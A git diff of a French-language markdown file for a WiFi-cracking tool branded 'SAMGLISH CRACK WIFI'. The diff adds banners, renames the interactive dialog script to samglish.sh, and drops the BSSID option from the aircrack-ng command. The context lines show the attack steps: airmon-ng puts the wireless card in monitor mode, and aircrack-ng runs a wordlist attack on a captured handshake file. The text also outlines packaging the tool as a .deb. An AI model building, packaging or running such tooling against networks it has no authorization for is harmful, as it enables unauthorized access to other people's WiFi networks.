@@ -4,7 +4,7 @@
 
 ```bash
 #!/bin/bash
-
+echo "***SAMGLISH CRACK WIFI***"
 echo "=== Activation du mode moniteur ==="
 sudo airmon-ng check kill
 sudo airmon-ng start wlan0
@@ -61,10 +61,11 @@ echo "=== Script terminé. Bonne chance pour le crack ! ==="
 sudo apt install dialog
 ```
 
-wifi_attack_ui.sh
+samglish.sh
 ```bash
 #!/bin/bash
 
+dialog --msgbox "***SAMGLISH CRACK WIFI***" 10 50
 # Vérification de dialog
 if ! command -v dialog &> /dev/null; then
     echo "dialog n'est pas installé. Lance : sudo apt install dialog"
@@ -103,9 +104,10 @@ wordlist=$(dialog --inputbox "Chemin vers votre dictionnaire (ex: /usr/share/wor
 # Étape 8 : craquage
 capfile="${output}-01.cap"
 dialog --msgbox "Début du craquage. Ceci peut prendre du temps." 7 50
-xterm -hold -e "aircrack-ng -w $wordlist -b $bssid $capfile"
+xterm -hold -e "aircrack-ng -w $wordlist $capfile"
 
 dialog --msgbox "Fin du script. Vérifie si le mot de passe a été trouvé !" 7 50
+
 ```
 ## Étapes pour créer un .deb : `samglish.deb`
 
